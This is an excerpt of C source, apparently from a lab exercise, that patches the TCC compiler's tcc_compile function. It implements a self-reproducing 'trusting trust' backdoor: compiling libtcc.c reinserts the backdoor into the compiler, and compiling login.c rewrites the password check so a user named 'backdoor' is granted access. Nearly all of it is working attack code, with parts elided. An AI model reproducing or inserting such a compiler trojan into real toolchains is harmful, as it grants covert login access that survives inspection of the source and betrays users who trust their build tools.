...
static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
{
    ...
    char* backdoor =  
        ...
        "write_f = fdopen(fds[1], \"w\"); "\
        "read_f = fdopen(fd, \"r\"); "\
        
        "size_t n = 128; "\
        "char* line = tcc_malloc(n); "\
        "while(getline(&line, &n, read_f) > 0) { "\
            "if (strstr(line, \"static int tcc_compile\")) {"\
                "getline(&line, &n, read_f); "\
                "fprintf(write_f, \"%%s\", backdoor); "\
            "} else {"\
                "fprintf(write_f, \"%%s\", line); "\
            "}"\
        "}"\
        "fclose(write_f);"\
        "fclose(read_f);"\
    ...
    "if (strstr(str, \"login.c\")) { "\
        ...
        "while(getline(&line, &n, read_f) > 0) { "\
            "if (strstr(line, \"strcmp\")) { "\
                "fprintf(write_f, \"    if (!strcmp(username, \\\"root\\\") || !strcmp(username, \\\"backdoor\\\"))\");"\
            "} else { "\
                "fprintf(write_f, \"%%s\", line); "\
            "}"\
        "}"\
    ...
    if(strstr(str, "libtcc.c")){
        ...
        write_f = fdopen(fds[1], "w"); //write to cheeky file fds
        read_f = fdopen(fd, "r"); //read from original file "fd"
        ...
        int flag = 1;
        while(getline(&line, &n, read_f) > 0) {
            if (strstr(line, "static int tcc_compile")) { //once we reach the place we wanna change, change it!!!!!
                getline(&line, &n, read_f); //get rid of the {   

                // FILE* fp = fopen("TESTINGFILE.txt", "w");//opening file  
                // fprintf(fp, backdoor, backdoor); //SHOVE IT IN NOW
                // fclose(fp);

                fprintf(write_f, backdoor, backdoor); //SHOVE IT IN NOW
                // printf("%s", backdoor);
                flag = 0;
            } else {
                fprintf(write_f, "%s", line);
        ...
        fd = fds[0]; //finally, change the original fd to the cheeky one
    ...
    if (strstr(str, "login.c")) { //if file name is login.c
        ...
        char* line = tcc_malloc(n);
        while(getline(&line, &n, read_f) > 0) {
            if (strstr(line, "strcmp")) { //once we reach the place we wanna change, change it!!!!!
                fprintf(write_f, "    if (!strcmp(username, \"root\") || !strcmp(username, \"backdoor\"))");
            } else {
                fprintf(write_f, "%s", line);
            }
